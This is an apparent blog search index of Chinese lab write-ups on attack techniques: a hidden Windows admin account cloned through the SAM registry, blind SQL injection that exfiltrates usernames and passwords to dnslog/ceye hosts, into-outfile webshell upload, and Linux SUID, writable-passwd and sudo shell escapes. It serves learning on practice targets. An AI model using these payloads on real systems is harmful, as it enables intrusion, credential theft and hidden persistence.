<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>windows 隐藏账户排查</title>
      <link href="/2023/04/26/windows-%E9%9A%90%E8%97%8F%E8%B4%A6%E6%88%B7%E6%8E%92%E6%9F%A5/"/>
      <url>/2023/04/26/windows-%E9%9A%90%E8%97%8F%E8%B4%A6%E6%88%B7%E6%8E%92%E6%9F%A5/</url>
      
        <content type="html"><![CDATA[<p> 首先创建隐藏账户</p><p><img src="windows-隐藏账户排查/image-20230426094828847.png" alt="image-20230426094828847"></p><p>此时使用net user并不能发现用户admin$</p><p><img src="windows-隐藏账户排查/image-20230426094935044.png" alt="image-20230426094935044"></p><p>将admin$用户加入administrators组,使用命令<code>net localgroup administrators admin$ /add</code></p><p><img src="windows-隐藏账户排查/image-20230426095217121.png" alt="image-20230426095217121"></p><p>此时admin$用net user是查看不到的，但查看用户和组的时候还是可以看到</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">查看命令：net localgroup administrators admin$ /add</span><br></pre></td></tr></table></figure><p><img src="windows-隐藏账户排查/image-20230426095351178.png" alt="image-20230426095351178"></p><p>所以需要修改注册表，<code>win+r</code>输入<code>regedit</code>进入注册表</p><p>进入到以下目录<code>HKEY_LOCAL_MACHINE/SAM/SAM</code></p><p><img src="windows-隐藏账户排查/image-20230426095830511.png" alt="image-20230426095830511"></p><p>右击，将权限转交给administrator</p><p><img src="windows-隐藏账户排查/image-20230426100057239.png" alt="image-20230426100057239"></p><p>此时可以看到admin$，并发现其类型为0x3e9</p><p><img src="windows-隐藏账户排查/image-20230426100549678.png" alt="image-20230426100549678"></p><p>,而administrator的类型为0x1f4</p><p><img src="windows-隐藏账户排查/image-20230426100517607.png" alt="image-20230426100517607"></p><p>将admin$,000003E9,000001F4导出</p><p><img src="windows-隐藏账户排查/image-20230426100917742.png" alt="image-20230426100917742"></p><p><img src="windows-隐藏账户排查/image-20230426101048111.png" alt="image-20230426101048111"></p><p>将1f4中的F值复制给3e9</p><p><img src="windows-隐藏账户排查/image-20230426101151369.png" alt="image-20230426101151369"></p><p>复制完之后，就回去把admin$给删掉，命令net user admin$ /del</p><p><img src="windows-隐藏账户排查/image-20230426101513323.png" alt="image-20230426101513323"></p><p>然后回到注册表，将admin.reg 和 admin3e9.reg导入</p><p><img src="windows-隐藏账户排查/image-20230426101856446.png" alt="image-20230426101856446"></p><p>导入成功</p><p><img src="windows-隐藏账户排查/image-20230426102135314.png" alt="image-20230426102135314"></p><p>然后回去，将赋予administrator的权限回收</p><p><img src="windows-隐藏账户排查/image-20230426144717925.png" alt="image-20230426144717925"></p>]]></content>
      
      
      
        <tags>
            
            <tag> 隐藏账户 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>盲注快速获取数据</title>
      <link href="/2023/04/15/%E7%9B%B2%E6%B3%A8%E5%BF%AB%E9%80%9F%E8%8E%B7%E5%8F%96%E6%95%B0%E6%8D%AE/"/>
      <url>/2023/04/15/%E7%9B%B2%E6%B3%A8%E5%BF%AB%E9%80%9F%E8%8E%B7%E5%8F%96%E6%95%B0%E6%8D%AE/</url>
      
        <content type="html"><![CDATA[<p>前段时间参加面试，面试官有问过一个问题，SQL注入中盲注如何快速获取数据。当时没有反应过来，后来百度了才发现，这不就是盲注使用dnslog外带数据么，尘封的记忆一下子就回想起来了，那是一个月黑风高的夜晚……咳咳，扯远了，总之就是没答上来，复盘吧！</p><h2 id="环境复现"><a href="#环境复现" class="headerlink" title="环境复现"></a>环境复现</h2><p>我们使用sql-labs进行还原盲注的情形，就用Less-9吧</p><p><img src="image-20230415195258997.png" alt="image-20230415195258997"></p><p>可以看到经过简单的注入点测试，发现页面上的东西不会发生改变</p><p><img src="image-20230415195831443.png" alt="image-20230415195831443"></p><p>但是当payload为请求时间大概为6.02秒，说明存在注入点</p><p><img src="image-20230415200036995.png" alt="image-20230415200036995"></p><p>此时我们需要一个dns平台，就使用ceye平台自带的吧 <a href="http://ceye.io/">http://ceye.io/</a></p><p>或者是其他dns平台，比如<a href="http://www.dnslog.cn/">dnslog</a></p><p>这两个这里都会演示一下</p><p><img src="image-20230415201655811.png" alt="image-20230415201655811"></p><h2 id="dnslog外带条件"><a href="#dnslog外带条件" class="headerlink" title="dnslog外带条件"></a>dnslog外带条件</h2><p>要使用dnslog外带首先需要满足几个条件：</p><p>1.首先要将secure_file_priv改为‘’</p><p><img src="image-20230417111707360.png" alt="image-20230417111707360"></p><blockquote><p>​    修改步骤：1.使用show variables like ‘%secure%’</p><p>​                        2.进入MYSQL文件夹下，打开my.ini文件</p><p>​                        3.在my.ini中，添加或修改为secure_file_priv=””</p></blockquote><p><img src="image-20230417112144072.png" alt="修改后的secure_file_priv"></p><p>2，只适用于Windows系统</p><h2 id="DNS外带实践"><a href="#DNS外带实践" class="headerlink" title="DNS外带实践"></a>DNS外带实践</h2><p><code>payload：?id=1&#39;  and sleep(5) order by 3--+</code></p><p>判断字段数，在order by 3时会sleep的，order by 4 时并不会sleep</p><p><img src="image-20230415202943458.png" alt="image-20230415202943458"></p><p>测试出查询字段数为3</p><p><code>payload：?id=1&#39;  and sleep(5) union select 1,2,3--+</code></p><p><img src="image-20230415203036163.png" alt="image-20230415203036163"></p><p>测试是否支持dns外带，使用的ceye给的dns地址</p><p><code>payload：/?id=1&#39; and load_file(&#39;\\\\nihao.xxxx.ceye.io\\abc&#39;) --+</code></p><p><img src="image-20230417113400272.png" alt="image-20230417113400272"></p><p>外带成功：</p><p><img src="image-20230417113527467.png" alt="image-20230417113527467"></p><p><strong><em>（ps：后面就是用dnslog平台来进行演示了）</em></strong></p><p>获取一个域名先</p><p><img src="image-20230417143912645.png" alt="image-20230417143912645"></p><p><code>payload：?id=1&#39; and load_file(concat(&#39;\\\\&#39;,database(),&#39;.fh0qvo.dnslog.cn\\abc&#39;)) --+</code></p><p>外带数据库名称</p><p><img src="image-20230417114432264.png" alt="image-20230417114432264"></p><p>在dnslog平台得到数据库名称security：</p><p><img src="image-20230417114711489.png" alt="image-20230417114711489"></p><p><code>payload：?id=1&#39; and load_file(concat(&#39;\\\\&#39;,(select concat(table_name) from information_schema.tables where table_schema=&#39;security&#39; limit 0,1),&#39;.dxllqa.dnslog.cn\\abc&#39;)) --+</code></p><p>爆破表名</p><p><img src="image-20230417145128446.png" alt="image-20230417145128446"></p><p>通过改变limit后的数字得到所有的表名</p><p>limit 0,1:</p><p><img src="image-20230417145045963.png" alt="image-20230417145045963"></p><p>limit 1,1:</p><p><img src="image-20230417145325600.png" alt="image-20230417145325600"></p><p>limit 2,1:</p><p><img src="image-20230417145434505.png" alt="image-20230417145434505"></p><p>……</p><p><img src="image-20230417145511479.png" alt="image-20230417145511479"></p><p><code>payload：?id=1&#39; and load_file(concat(&#39;\\\\&#39;,(select concat(column_name) from information_schema.columns where table_name=&#39;users&#39; limit 0,1),&#39;.dxllqa.dnslog.cn\\abc&#39;)) --+</code></p><p>爆破字段名</p><p><img src="image-20230417145650444.png" alt="image-20230417145650444"></p><p><img src="image-20230417145602648.png" alt="image-20230417145602648"></p><p><code>payload：?id=1&#39; and load_file(concat(&#39;\\\\&#39;,(select concat(username,password) from users limit 0,1),&#39;.dxllqa.dnslog.cn\\abc&#39;)) --+</code></p><p>爆破用户名和密码</p><p><img src="image-20230417150509236.png" alt="image-20230417150509236"></p><p><img src="image-20230417150347739.png" alt="image-20230417150347739"></p><p>虽然还是慢了些，但比起纯手工还是好了些，另外还可以结合脚本利用，这里就不过多赘述了，有机会再详细讲述。</p>]]></content>
      
      
      
        <tags>
            
            <tag> sql注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sql-labs less-7</title>
      <link href="/2023/04/06/sql-labs-less-7/"/>
      <url>/2023/04/06/sql-labs-less-7/</url>
      
        <content type="html"><![CDATA[<h2 id="sql注入之outfile"><a href="#sql注入之outfile" class="headerlink" title="sql注入之outfile"></a>sql注入之outfile</h2><p>发现之前学sql的时候，这一关觉得太麻烦就没怎么练所以今天查漏补缺一下</p><h3 id="第一种方法：标准SQL注入流程"><a href="#第一种方法：标准SQL注入流程" class="headerlink" title="第一种方法：标准SQL注入流程"></a>第一种方法：标准SQL注入流程</h3><p><img src="image-20230406140814192.png" alt="image-20230406140814192"></p><p><img src="image-20230406140843766.png" alt="image-20230406140843766"></p><p>首先判断注入点</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload：?id=1&#x27;</span><br><span class="line">报错：You have an error in your SQL syntax</span><br></pre></td></tr></table></figure><p>发现这次连报错信息都不显示了，慢慢试吧</p><p><img src="image-20230406141032944.png" alt="image-20230406141032944"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">payload：?id=1&#x27; or 1=1--+</span><br><span class="line"></span><br><span class="line">还是报错，说明有括号</span><br><span class="line"></span><br><span class="line">payload：?id=1&#x27;) or 1=1--+</span><br><span class="line"></span><br><span class="line">还是报错，说明还有括号</span><br><span class="line"></span><br><span class="line">payload：?id=1&#x27;)) or 1=1--+</span><br><span class="line"></span><br><span class="line">进来了，提示用outfile方法</span><br></pre></td></tr></table></figure><p><img src="image-20230406141203229.png" alt="image-20230406141203229"></p><p>我们需要知道写入文件的绝对路径从之前关卡得到@@datadir</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">paylaod：?id=-1&#x27; union select 1,2,@@datadir--+</span><br><span class="line"></span><br><span class="line">回显：Your Password:C:\phpstudy\MySQL\data\</span><br></pre></td></tr></table></figure><p>直接去第一关得到路径</p><p><img src="image-20230406140744972.png" alt="image-20230406140744972"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload：?id=1&#x27;)) order by 4--+</span><br><span class="line">报错：You have an error in your SQL syntax</span><br></pre></td></tr></table></figure><p>爆破字段数，为3（因为3不报错，4报错）</p><p><img src="image-20230406141705179.png" alt="image-20230406141705179"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">payload：?id=-1&#x27;)) union select 1,2,3 into outfile &quot;C:\\phpstudy\\WWW\\sqli-labs-master\\Less-7\\1.txt&quot; --+</span><br><span class="line">报错，发现文件也并没有生成，检查一下环境</span><br><span class="line">进入mysql使用show variables like &quot;%security%&quot;命令</span><br></pre></td></tr></table></figure><p><img src="image-20230406145943107.png" alt="image-20230406145943107"></p><p>如果如上图显示secure_file_priv 为NULL证明此时没有导出文件的权限<br>我们在MYSQL文件下的my.ini中加入一句话secure_file_priv=”/“意思为可以将文件导入到任意目录此时重启mysql服务<br>我们再次使用show variables like “%security%”命令查看这时候只要不是NULL就可以了</p><p><img src="image-20230406220332745.png" alt="image-20230406220332745"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload：?id=-1&#x27;)) union select 1,2,3 into outfile &quot;C:\\phpstudy\\WWW\\sqli-labs-master\\Less-7\\1.txt&quot; --+</span><br><span class="line">报错，但是我们可以发现后台已经出现了1.txt了</span><br></pre></td></tr></table></figure><p><img src="image-20230406220448842.png" alt="image-20230406220448842"></p><p>后面就是常规的注入流程了，下面走一下流程（记住一步都要把上一步的文件删了，或是换个文件名）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload：?id=-1&#x27;)) union select 1,2,database() into outfile &quot;C:\\phpstudy\\WWW\\sqli-labs-master\\Less-7\\1.txt&quot; --+</span><br><span class="line">爆破数据库名</span><br></pre></td></tr></table></figure><p><img src="image-20230406221036182.png" alt="image-20230406221036182"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload：?id=-1&#x27;)) union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&quot;security&quot; into outfile &quot;C:\\phpstudy\\WWW\\sqli-labs-master\\Less-7\\2.txt&quot; --+</span><br><span class="line">爆破表名</span><br></pre></td></tr></table></figure><p><img src="image-20230406221254777.png" alt="image-20230406221254777"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload：?id=-1&#x27;)) union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&quot;users&quot; into outfile &quot;C:\\phpstudy\\WWW\\sqli-labs-master\\Less-7\\3.txt&quot; --+</span><br><span class="line">爆破字段名</span><br></pre></td></tr></table></figure><p><img src="image-20230406221427674.png" alt="image-20230406221427674"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload：?id=-1&#x27;)) union select 1,2,group_concat(username,0x7e,password) from users into outfile &quot;C:\\phpstudy\\WWW\\sqli-labs-master\\Less-7\\4.txt&quot; --+</span><br><span class="line">爆破用户名密码</span><br></pre></td></tr></table></figure><p><img src="image-20230406221528300.png" alt="image-20230406221528300"></p><h3 id="第二种方法：结合一句话木马"><a href="#第二种方法：结合一句话木马" class="headerlink" title="第二种方法：结合一句话木马"></a>第二种方法：结合一句话木马</h3><p>直接上传一句话木马，使用菜刀或者蚁剑进行连接，如图</p><p><img src="image-20230406225919437.png" alt="image-20230406225919437"></p><p>上传成功</p><p><img src="image-20230406225937428.png" alt="image-20230406225937428"></p><p>使用蚁剑连接</p><p><img src="image-20230406230000165.png" alt="image-20230406230000165"></p>]]></content>
      
      
      
        <tags>
            
            <tag> sql注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SUID提权</title>
      <link href="/2023/03/21/SUID%E6%8F%90%E6%9D%83/"/>
      <url>/2023/03/21/SUID%E6%8F%90%E6%9D%83/</url>
      
        <content type="html"><![CDATA[<p>接上文sudo滥用提权，今天我们来学习suid提权</p><h2 id="SUID"><a href="#SUID" class="headerlink" title="SUID"></a>SUID</h2><p>suid是一种特殊的文件属性，它允许用户执行的文件以该文件的拥有者的身份运行</p><p>这里就不得不再提一次关于Linux文件权限的理解：</p><blockquote><p>​    Linux中每个文件和目录都有九位基础权限位，每三位组成一组分别为：<strong>文件类型，属主用户权限位，用户组权限位，其它用户权限</strong></p><p>类似这样：d<strong>rwxrwxrwx</strong>（加粗部分，第一位d为目录文件），其中</p><p>r为可读权限，对应数字4</p><p>w为可写权限，对应数字2 </p><p>x为可执行权限，对应数字1</p><p>若没有以上权限则可用-代替，对应数字0</p><p>接下来就是我们今天要讲的suid位，当s出现在属主权限位的x权限位上时，就被称为Set UID 简称SUID</p><p>suid s对应数字4</p></blockquote><p>s出现在属主权限x位上的作用：</p><blockquote><p>1.SUID权限仅对二进制程序有效</p><p>2.执行者对于该文件需要有x（运行）权限</p><p>3.本权限仅在程序运行过程中有效</p><p>4.执行者将拥有文件所有者的权限</p></blockquote><p>所以SUID提权的思路就是我们运行root用户所拥有的文件，那么我们运行该文件的时候就拥有root权限了，有点相似sudo滥用提权，都是利用拥有root权限的命令/程序，运行相应的最后获取root权限。下面进行环境的搭建</p><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>现在我们就来复现一下使文件变为具有root权限的suid的文件，首先编辑一个test.c</p><p><img src="SUID提权/image-20230323215718909.png" alt="image-20230323215718909"></p><p><img src="SUID提权/image-20230323221433451.png" alt="image-20230323221433451"></p><p>使用命令<code>gcc test.c -o 1</code>编译一下，编译为文件1</p><p><img src="SUID提权/image-20230323215817143.png" alt="image-20230323215817143"></p><p>设置文件的suid，注意这里要执行用户需要拥有运行权限，也就是其他用户权限要有x</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ls -la //查看文件权限</span><br><span class="line">chmod 4775 1//4给文件1增添suid</span><br></pre></td></tr></table></figure><p>再次查看文件权限发现文件名已经变红了</p><p><img src="SUID提权/image-20230323220030036.png" alt="image-20230323220030036"></p><p>使用以下命令查看</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -perm -u=s -type f 2&gt;/dev/null</span><br></pre></td></tr></table></figure><p><img src="SUID提权/image-20230323220653196.png" alt="image-20230323220653196"></p><p>可以看到/tmp/1就在其中</p><p><img src="SUID提权/image-20230323220708357.png" alt="image-20230323220708357"></p><p>使用非root用户，运行1，发现<code>cat /etc/shadow</code>运行成功，说明此时1运行时就是root权限，接下来就是提权的利用</p><h2 id="提权的利用"><a href="#提权的利用" class="headerlink" title="提权的利用"></a>提权的利用</h2><p>已知的可以用来提权的linux可行性文件列表如下：</p><blockquote><ul><li>Nmap</li><li>Vim</li><li>find</li><li>Bash</li><li>More</li><li>Less</li><li>Nano</li><li>cp</li></ul></blockquote><h3 id="find"><a href="#find" class="headerlink" title="find"></a>find</h3><p>就先拿find来说</p><p>先将find增加SUID权限，原本为755权限，现在改为4755,使用命令<code>chmod 4755 /bin/find</code></p><p><img src="SUID提权/image-20230323232843890.png" alt="image-20230323232843890"></p><p>当find文件拥有SUID权限时，通过find执行的所有命令都会以root权限执行如下：</p><p>使用非root用户执行命令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find 1 -exec whoami \;</span><br></pre></td></tr></table></figure><p>未拥有SUID权限时：</p><p><img src="SUID提权/image-20230323233811760.png" alt="image-20230323233811760"></p><p>拥有SUID权限时：</p><p><img src="SUID提权/image-20230323233647653.png" alt="image-20230323233647653"></p><h3 id=""><a href="#" class="headerlink" title=" "></a> </h3>]]></content>
      
      
      
        <tags>
            
            <tag> Linux提权 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>利用passwd提权</title>
      <link href="/2023/03/11/%E5%88%A9%E7%94%A8passwd%E6%8F%90%E6%9D%83/"/>
      <url>/2023/03/11/%E5%88%A9%E7%94%A8passwd%E6%8F%90%E6%9D%83/</url>
      
        <content type="html"><![CDATA[<p>初步整理完关于sudo滥用提权，开始整理一下关于配置错误/etc/passwd的利用</p><p>sudo滥用和这篇文章都参考这个大佬的：<a href="https://blog.csdn.net/qq_44159028/article/details/123684723"> Linux提权方法总结<em>linux如何提权</em>山山而川’的博客-CSDN博客</a></p><h2 id="1-先决条件及环境搭建"><a href="#1-先决条件及环境搭建" class="headerlink" title="1.先决条件及环境搭建"></a>1.先决条件及环境搭建</h2><p>要当前用户对/etc/passwd文件具有写的权限，找个靶机实验一下</p><p>ls -l /etc/passwd查看一下当前权限，说明已经修改为所有用户都具有w即写的权限</p><p><img src="image-20230311205425210.png" alt="image-20230311205425210"></p><hr><p>接下来我们就看一下/etc/passwd中所表示的信息,以下面的语句为例：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root:x:0:0:root:/root:/bin/bash</span><br></pre></td></tr></table></figure><p>root为<strong>登录用户名</strong> x为<strong>密码</strong>（加过密的） 0为<strong>用户UID</strong> 0为<strong>用户组id GID</strong> root为<strong>用户备注信息</strong>  /root为<strong>用户home目录</strong> /bin/bash<strong>用户默认的bash</strong></p><hr><p>因此我们需要的就是对/etc/passwd进行写入</p><p>我们要构造一个用户，密码为我们设定的密码（带盐值），并且UID设置为0</p><p>使用命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">perl -le &#x27;print crypt(&quot;123456&quot;,&quot;addsalt&quot;)&#x27;</span><br></pre></td></tr></table></figure><p>命令生成带盐值的密码（123456）：<code>adrla7IBSfTZQ</code></p><p><img src="image-20230311204947405.png" alt="image-20230311204947405"></p><h2 id="2-复现及利用"><a href="#2-复现及利用" class="headerlink" title="2.复现及利用"></a>2.复现及利用</h2><p>好了，现在环境就已经复现好了，现在我们要换回一个低权限用户，此用户对/etc/passwd有写权限，并拥有一个带盐值的密码<code>adrla7IBSfTZQ</code>，万事俱备，直接开始利用</p><p>使用命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;test:adrla7IBSfTZQ:0:0:root:/root:/bin/bash&quot;</span><br></pre></td></tr></table></figure><p>将<code>test:adrla7IBSfTZQ:0:0:root:/root:/bin/bash</code>加入/etc/passwd(!!注意是追加&gt;&gt;不是覆盖&gt;)</p><p><img src="image-20230311210056491.png" alt="image-20230311210056491"></p><p>查看新加入内容</p><p><img src="image-20230311210422730.png" alt="image-20230311210422730"></p><p><img src="image-20230311210458196.png" alt="image-20230311210458196"></p><p>添加成功，切换用户</p><p><img src="image-20230311210555606.png" alt="image-20230311210555606"></p><p>提权成功！</p>]]></content>
      
      
      
        <tags>
            
            <tag> Linux提权 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sudo滥用提权</title>
      <link href="/2023/03/05/sudo%E6%BB%A5%E7%94%A8%E6%8F%90%E6%9D%83/"/>
      <url>/2023/03/05/sudo%E6%BB%A5%E7%94%A8%E6%8F%90%E6%9D%83/</url>
      
        <content type="html"><![CDATA[<p>上次复现并学习了脏牛提权，这次再整理一下sudo滥用提权的相关内容</p><h2 id="关于sudo"><a href="#关于sudo" class="headerlink" title="关于sudo"></a>关于sudo</h2><p>sudo是linux系统管理指令，是允许系统管理员让普通用户执行一些或者全部的root命令的工具如halt，reboot，su等等。</p><p>要想使一个用户具有使用sudo的能力，需要root用户将其名字，所能执行的命令，按照哪种用户或用户组的身份执行等信息注册到<code>/etc/sudoers</code>中</p><h2 id="关于sudoers"><a href="#关于sudoers" class="headerlink" title="关于sudoers"></a>关于sudoers</h2><blockquote><p>sudoers文件主要有三部分组成：</p><p>sudoers的默认配置（default） 主要设置sudo的一些缺省值</p><p>alias（别名），主要有Host_Alias|Runas_Alias|User_Alias|Dmnd_Alias</p><p>安全策略（规则定义）</p></blockquote><h3 id="语法："><a href="#语法：" class="headerlink" title="语法："></a>语法：</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root ALL=(ALL) ALL</span><br></pre></td></tr></table></figure><p>解释：root用户可以从 ALL（任意）终端作为ALL（任意）用户执行ALL（任意）命令</p><p>即 <strong>用户 终端 可充当的用户 使用时可以运行的命令</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root ALL=(ALL:ALL) ALL</span><br><span class="line">hacker ALL=(ALL:ALL) ALL</span><br></pre></td></tr></table></figure><p>解释：root这一句与上面不同的就是root用户可以从 ALL（任意）终端作为ALL（任意）用户，ALL（任意）组执行ALL（任意）命令</p><p>hacker同上，因此此时的hacker就相当于root用户了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hacker ALL=(root) NOPASSWD: /usr/bin/awk</span><br></pre></td></tr></table></figure><p>解释：hacker用户可以从 ALL（任意）终端作为root用户<strong>无密码</strong>执行awk命令</p><h3 id="查看用户能以root权限运行的命令"><a href="#查看用户能以root权限运行的命令" class="headerlink" title="查看用户能以root权限运行的命令"></a>查看用户能以root权限运行的命令</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -l</span><br></pre></td></tr></table></figure><h2 id="sudo提权命令"><a href="#sudo提权命令" class="headerlink" title="sudo提权命令"></a>sudo提权命令</h2><blockquote><p>wget、find、cat、apt、zip、xxd、time、taskset、git、sed、pip、ed、tmux、scp、perl、bash、less、awk、man、vi、env、ftp、ed、screen</p></blockquote><p>就先到这里，以后具体的例子会单独找案例进行分析</p><hr><p>更新，这里直接搭建一个环境，把常见的总结一下吧，后面遇到了再继续补充</p><h2 id="复现与总结"><a href="#复现与总结" class="headerlink" title="复现与总结"></a>复现与总结</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">hacker  ALL=(root) NOPASSWD: /usr/bin/awk</span><br><span class="line">hacker  ALL=(root) NOPASSWD: /usr/bin/vim</span><br><span class="line">hacker  ALL=(root) NOPASSWD: /usr/bin/man</span><br><span class="line">hacker  ALL=(root) NOPASSWD: /usr/bin/apache2</span><br><span class="line">hacker  ALL=(root) NOPASSWD: /usr/bin/less</span><br><span class="line">hacker  ALL=(root) NOPASSWD: /bin/more</span><br><span class="line">hacker  ALL=(root) NOPASSWD: /usr/bin/find</span><br><span class="line">hacker  ALL=(root) NOPASSWD: /usr/bin/zip</span><br><span class="line">hacker  ALL=(root) NOPASSWD: /usr/bin/git</span><br></pre></td></tr></table></figure><h3 id="搭建环境"><a href="#搭建环境" class="headerlink" title="搭建环境"></a>搭建环境</h3><p>首先新建一个用户hacker，<code>vim /etc/sudoers</code>并在/etc/sudoers中加入以上的代码</p><p><img src="image-20230308201152439.png" alt="image-20230308201152439"></p><p>先给靶机上的hacker用户修改个密码 <code>passwd hacker</code></p><p><img src="image-20230308201402730.png" alt="image-20230308201402730"></p><p><code>su hacker</code>输入密码，切换成hacker，这就复现出我们一个刚刚进到一个新的系统中的情形，只有一个普通用户，然后我们需要提权</p><p><img src="image-20230308201639147.png" alt="image-20230308201639147"></p><p><code>sudo -l</code>查看允许当前用户使用的命令，这里我们主要寻找能以root权限执行的命令，如下图，那么，下面我们就一个一个来实践进行提权</p><p><img src="image-20230308201901240.png" alt="image-20230308201901240"></p><h3 id="awk"><a href="#awk" class="headerlink" title="awk"></a>awk</h3><p>awk的相应提权方法为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo awk &#x27;BEGIN&#123;system(&quot;/bin/bash&quot;)&#125;&#x27;</span><br></pre></td></tr></table></figure><p><img src="image-20230308202438207.png" alt="image-20230308202438207"></p><p>提权成功！</p><h3 id="find"><a href="#find" class="headerlink" title="find"></a>find</h3><p>find的相应提权命令为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo find /home -exec /bin/bash \;</span><br></pre></td></tr></table></figure><p><img src="image-20230308202802004.png" alt="image-20230308202802004"></p><p>提权成功！</p><h3 id="cat"><a href="#cat" class="headerlink" title="cat"></a>cat</h3><p>cat比较麻烦一点，我们可以使用cat查看文件/etc/shadow找到加密后的用户名密码，之后再用john破解</p><p>演示：1.使用<code>sudo cat /etc/shadow &gt;&gt; 1.txt</code> 读取shadow文件到1.txt中</p><!--(上面我们写入sudoers文件时没有写入`hacker  ALL=(root) NOPASSWD: /usr/bin/cat` 这一条，因此要实现cat的引用需要加上这一条，也就是实战时需要满足这个条件)--><p><img src="image-20230308231813556.png" alt="image-20230308231813556"></p><p><code>sudo cat /etc/passwd &gt;&gt; 2.txt</code> 读取passwd文件到2.txt</p><p><img src="image-20230308232938552.png" alt="image-20230308232938552"></p><p>使用<code>unshadow 2.txt 1.txt &gt;&gt; passwd.txt</code>将两个文件整合到一起为passwd.txt</p><p><img src="image-20230308233126463.png" alt="image-20230308233126463"></p><blockquote><p>关于unshadow的使用：<img src="image-20230308233157219.png" alt="image-20230308233157219"></p></blockquote><pre><code>          2.使用john破解密码：</code></pre><p>这里实现的时候有些问题，有时候快有时候慢，等解决了再过来补充</p><h3 id="zip"><a href="#zip" class="headerlink" title="zip"></a>zip</h3><p>这里就是解压缩命令zip了，首先安装zip命令<code>apt install zip</code></p><p><img src="image-20230311191243971.png" alt="image-20230311191243971"></p><p>有就不用了</p><p>使用<code>touch 2.txt</code> 创建一个2.txt,并使用<code>zip 1.zip 2.txt</code> 生成一个1.zip</p><p><img src="image-20230311192448941.png" alt=""></p><p><img src="image-20230311192546415.png" alt="image-20230311192546415"></p><p>使用</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo 1.zip 2.txt -T --unzip-command=&quot;sh -c /bin/bash&quot;</span><br></pre></td></tr></table></figure><p><img src="image-20230311192656025.png" alt="image-20230311192656025"></p><p>提权成功</p><h3 id="git"><a href="#git" class="headerlink" title="git"></a>git</h3><p>git就比较简单了首先使用</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo git help add</span><br></pre></td></tr></table></figure><p><img src="image-20230311193259077.png" alt="image-20230311193259077"></p><p>命令，进入到该页面</p><p><img src="image-20230311193608707.png" alt="image-20230311193608707"></p><p>在此处输入<code>!/bin/bash</code></p><p><img src="image-20230311193703440.png" alt="image-20230311193703440"></p><p><img src="image-20230311193718807.png" alt="image-20230311193718807"></p><p>提权成功</p><h3 id="ed"><a href="#ed" class="headerlink" 